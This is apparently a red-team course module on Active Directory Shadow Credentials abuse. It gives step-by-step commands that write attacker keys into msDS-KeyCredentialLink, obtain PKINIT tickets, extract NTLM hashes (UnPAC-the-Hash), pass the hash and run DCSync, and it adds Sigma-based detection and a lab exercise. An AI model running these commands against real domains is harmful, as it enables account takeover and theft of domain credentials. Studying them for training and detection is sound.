---
title: "Shadow Credentials and PKINIT Abuse — UnPAC-the-Hash"
tags: [red-team, active-directory, shadow-credentials, PKINIT, msDS-KeyCredentialLink,
  Whisker, pyWhisker, UnPAC-the-Hash, certificate, T1556, ATT&CK, detection,
  Kerberos, NTLM-hash-retrieval]
module: 08-RedTeam-03
day: 544
related_topics:
  - Delegation Attacks (Day 543)
  - ADCS Advanced (Day 545)
  - ADCS ESC1 Lab (Day 512)
  - Shadow Credentials concepts (Day 499 partial)
  - Domain Dominance (Day 499)
---

# Day 544 — Shadow Credentials and PKINIT Abuse

> "Shadow Credentials is one of the most surgical account takeover techniques
> in Active Directory. No password change, no service disruption, no golden
> ticket — just a certificate silently added to an attribute that most defenders
> have never heard of. The account owner keeps logging in normally. You log in
> as them simultaneously via PKINIT and get their NTLM hash without ever
> touching their password. It is patient, precise, and hard to detect without
> the right audit policy enabled."
>
> — Ghost

---

## Goals

Understand the msDS-KeyCredentialLink attribute and how Windows Hello for
Business uses it.
Execute a Shadow Credentials attack using Whisker and pyWhisker.
Use PKINIT authentication with the forged certificate to retrieve the
target account's NTLM hash (UnPAC-the-Hash).
Use the NTLM hash for pass-the-hash lateral movement or DCSync.
Write detection rules for Shadow Credentials attacks.

**Prerequisites:** Day 543 (delegation attacks), ADCS and certificate basics
(Days 511–512), BloodHound for ACL identification.
**Time budget:** 4 hours.

---

## Part 1 — msDS-KeyCredentialLink and Windows Hello for Business

```
What is msDS-KeyCredentialLink?
  An Active Directory attribute on user and computer objects.
  Stores a "Key Credential" — a public key that Windows Hello for
  Business (WHfB) links to an account for passwordless authentication.

How WHfB uses it:
  1. Device generates an RSA key pair during WHfB enrollment
  2. Public key is written to the user's msDS-KeyCredentialLink attribute
  3. Private key is stored in the device's TPM
  4. When the user authenticates: the device proves possession of the
     private key → the DC validates against the stored public key → auth succeeds

Attack — Shadow Credentials:
  Requirement: write access to the TARGET's msDS-KeyCredentialLink attribute
  (GenericWrite, AllExtendedRights, WriteProperty on this specific attribute)
  
  Attack:
  1. Generate a new RSA key pair (attacker controls both public and private key)
  2. Write the public key into the target's msDS-KeyCredentialLink
  3. Authenticate to the DC as the target using PKINIT (Kerberos + certificate)
     with the private key
  4. DC validates the key against msDS-KeyCredentialLink → authentication succeeds
  5. The original user is unaffected — their WHfB key is still there

UnPAC-the-Hash:
  When PKINIT authentication succeeds, the KDC includes the user's NTLM hash
  in the Privilege Attribute Certificate (PAC) of the returned TGT.
  This is a deliberate feature (for legacy protocol compatibility).
  Result: from a certificate-based auth, you get the NTLM hash — no brute force.
```

---

## Part 2 — Finding Shadow Credentials Attack Paths

```powershell
# Method 1: BloodHound — "Write to msDS-KeyCredentialLink" edge
# Pre-built query does not always show this — check manually:
# MATCH (u:User {owned:true})-[r:GenericWrite|AllExtendedRights|WriteProperty]
#       ->(t:User|Computer)
# WHERE r.rightname = 'ms-DS-Key-Credential-Link' OR r.rightname IS NULL
# RETURN u.name, t.name, type(r)

# Method 2: PowerView
Import-Module PowerView.ps1
# Find accounts where your_user has GenericWrite:
Find-InterestingDomainAcl -ResolveGUIDs |
    Where-Object {
        $_.IdentityReferenceName -eq "your_user" -and
        $_.ActiveDirectoryRights -match "GenericWrite|WriteProperty"
    }

# Method 3: Check msDS-KeyCredentialLink on a specific target
Get-ADUser -Identity target_user \
    -Properties msDS-KeyCredentialLink |
    Select-Object Name, msDS-KeyCredentialLink

# Empty msDS-KeyCredentialLink = no WHfB enrolled = cleaner to attack
# (no existing key to preserve — just add yours)
```

---

## Part 3 — Executing Shadow Credentials with Whisker

```
Whisker (C# tool) — Windows-side execution:
  Requires: a C2 session or direct access to a domain-joined Windows host
  Action: adds a new key credential to target's msDS-KeyCredentialLink

pyWhisker (Python) — from attack host via proxychains:
  Requires: network access to DC (via pivot)
  Action: same functionality via LDAP
```

### Using pyWhisker (from Attack Host via Proxy)

```bash
# Install pyWhisker
pip3 install pywhisker

# Step 1: List existing key credentials on the target account
proxychains python3 pywhisker.py \
    -d corp.local -u your_user -p 'your_pass' \
    --target target_user \
    --action list \
    --dc-ip <DC_IP>

# Step 2: Add a new Shadow Credential (generates PFX + password)
proxychkers python3 pywhisker.py \
    -d corp.local -u your_user -p 'your_pass' \
    --target target_user \
    --action add \
    --dc-ip <DC_IP>

# Output:
#   [+] KeyID: XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX
#   [+] Saving certificate and key to: <GUID>.pfx (password: <random_pass>)
#   [!] To use the PFX certificate, use the following command:
#       python3 gettgtpkinit.py ... <GUID>.pfx <GUID>

# Save the PFX file path and password — you need them for PKINIT
```

### Using Whisker (C# on Windows)

```powershell
# On a compromised Windows host with a C2 session:
execute-assembly Whisker.exe add /target:target_user /domain:corp.local \
    /dc:DC01.corp.local

# Output includes:
# [+] PFX saved to: <GUID>.pfx
# [+] PFX password: <RANDOM>
# [*] Run the following Rubeus command to get a TGT:
#     Rubeus.exe asktgt /user:target_user /certificate:<GUID>.pfx
#     /password:<RANDOM> /nowrap /ptt
```

---

## Part 4 — PKINIT Authentication and UnPAC-the-Hash

### Step 1: Request a TGT via PKINIT (Certificate-Based Authentication)

```bash
# From attack host via proxychains (Linux):
proxychains python3 gettgtpkinit.py \
    corp.local/target_user \
    -cert-pfx <GUID>.pfx \
    -pfx-pass '<RANDOM_PASS>' \
    -dc-ip <DC_IP> \
    target_user.ccache

# gettgtpkinit.py is from PKINITtools:
# git clone https://github.com/dirkjanm/PKINITtools

# This returns a TGT for target_user — you are now authenticated as target_user

# Verify:
export KRB5CCNAME=target_user.ccache
proxychains python3 -c "
import subprocess
result = subprocess.run(['klist'], capture_output=True, text=True)
print(result.stdout)"
```

### Step 2: Extract the NTLM Hash (UnPAC-the-Hash)

```bash
# The TGT returned via PKINIT contains the user's NT hash in the PAC
# PKINITtools provides getnthash.py to extract it:

proxychains python3 getnthash.py \
    corp.local/target_user \
    -key <KDC_SESSION_KEY>     # extracted from the TGT by gettgtpkinit.py
    -dc-ip <DC_IP>

# Output: NTLM hash for target_user
# Example: NTLM hash: aad3b435b51404eeaad3b435b51404ee:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

### Step 3: Use the NTLM Hash for Pass-the-Hash

```bash
# Pass-the-hash to any service target_user has access to:
proxychains crackmapexec smb 10.10.10.0/24 \
    -u target_user -H '<NTLM_HASH>' --no-bruteforce

# If target_user is a Domain Admin:
proxychains impacket-secretsdump \
    -hashes :<NTLM_HASH> corp.local/target_user@<DC_IP>

# PTH for evil-winrm:
proxychains evil-winrm -i <TARGET_IP> \
    -u target_user -H '<NTLM_HASH>'
```

---

## Part 5 — Targeting Computer Accounts with Shadow Credentials

```
Why target computer accounts (not just users)?
  Domain Controllers have machine accounts that can DCSync
  If you add a Shadow Credential to a DC's computer account,
  you can get the DC machine account's NTLM hash → DCSync

  Requirements: write access to the DC's computer object
  (GenericWrite on a DC computer object is extremely high privilege)
  More commonly: compromise a service account with GenericWrite on any
  high-privilege computer object (e.g., an admin workstation)

Targeting a computer account:
  pywhisker.py ... --target 'DC01$' --action add

  Then PKINIT as DC01$:
  gettgtpkinit.py corp.local/'DC01$' -cert-pfx DC01.pfx -pfx-pass '<pass>' \
    -dc-ip <DC_IP> dc01.ccache

  UnPAC the NT hash:
  getnthash.py corp.local/'DC01$' -key <session_key> -dc-ip <DC_IP>

  Use DC01$'s NT hash to DCSync:
  impacket-secretsdump -hashes :<DC01_NTLM> corp.local/'DC01$'@<DC_IP>
```

---

## Part 6 — Detection

```
Primary detection: Event ID 5136 (Directory Service Object Modified)
  AttributeLDAPDisplayName: msDS-KeyCredentialLink
  Alert: any write to this attribute is suspicious unless WHfB enrollment
  is explicitly in use in your environment

  Sigma:
    logsource:
      product: windows
      service: security
    detection:
      selection:
        EventID: 5136
        AttributeLDAPDisplayName: 'msDS-KeyCredentialLink'
      filter:
        SubjectUserName|endswith: '$'   # machine accounts doing WHfB enrollment
      condition: selection and not filter
    falsepositives:
      - Legitimate WHfB device enrollment
      - Microsoft Intune managed device registration

Secondary detection: PKINIT auth from non-enrolled device
  Event ID 4768 (Kerberos TGT request):
    Certificate information present (CertIssuerName, CertSerialNumber)
    These fields are populated for PKINIT auth — absent for password auth
  Alert: PKINIT auth for a user account from a device not in WHfB inventory

Cleanup detection:
  Defenders looking for past attacks:
  Check msDS-KeyCredentialLink on all user objects for entries older than
  any legitimate WHfB enrollment date — orphaned entries from old attacks

  Detection script:
  Get-ADUser -Filter * -Properties msDS-KeyCredentialLink |
      Where-Object { $_.msDS-KeyCredentialLink -ne $null } |
      Select-Object Name, msDS-KeyCredentialLink
  → Review all populated entries; any unrecognised key = suspicious
```

---

## Lab Exercise: Full Shadow Credentials Chain

```
Lab setup:
  → AD lab with two domain user accounts:
      attacker_user (you control this)
      target_user   (has DA path via BloodHound)
  → attacker_user has GenericWrite on target_user (configure in lab)
  → Enable Event ID 5136 auditing before starting

Exercise (2 hours):
  1. Confirm GenericWrite from attacker_user to target_user via BloodHound
  2. Use pyWhisker to add a shadow credential to target_user
  3. Verify Event ID 5136 fired — capture the raw event
  4. Use gettgtpkinit.py to authenticate as target_user via the PFX
  5. Use getnthash.py to extract target_user's NTLM hash
  6. Use the NTLM hash to authenticate to another lab host via PTH
  7. Clean up: pyWhisker --action remove --device-id <GUID>
  8. Verify the shadow credential is gone (--action list shows nothing)

  Write the Sigma rule that would alert on step 2 (the attribute write)
  with a false positive filter for legitimate WHfB enrollment
```

---

## Key Takeaways

1. Shadow Credentials is a privilege escalation path that requires no password
   knowledge, leaves no failed login events, and does not disrupt the target
   account's normal operation. It is uniquely stealthy among AD account
   takeover techniques.
2. UnPAC-the-Hash is the mechanism that converts certificate-based Kerberos
   authentication into an NTLM hash — a deliberate Windows design choice for
   legacy protocol compatibility. It means any PKINIT authentication path
   (including Shadow Credentials) gives you the NTLM hash as a byproduct.
3. The attack surface is GenericWrite or WriteProperty on msDS-KeyCredentialLink
   on any account. BloodHound tracks GenericWrite edges but requires version 4+
   to specifically identify msDS-KeyCredentialLink write permissions — use it
   alongside manual ACL review for complete coverage.
4. Detection requires Event ID 5136 auditing (Directory Service Object Modified)
   to be enabled. This is not enabled by default. Most AD environments have
   a blind spot for this entire attack class because 5136 is not in their
   default audit policy.
5. The technique also works against computer accounts — including Domain
   Controllers. If an attacker can write to a DC's msDS-KeyCredentialLink
   (extremely high privilege to acquire), they get the DC machine account's
   hash, which allows DCSync without needing the krbtgt hash first.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q544.1, Q544.2 …).

---

## Navigation

← Previous: [Day 543 — Delegation Attacks](DAY-0543-Delegation-Attacks-Deep-Dive.md)
→ Next: [Day 545 — ADCS Advanced: ESC4, ESC6, and Certificate Mapping](DAY-0545-ADCS-Advanced-ESC4-ESC6.md)
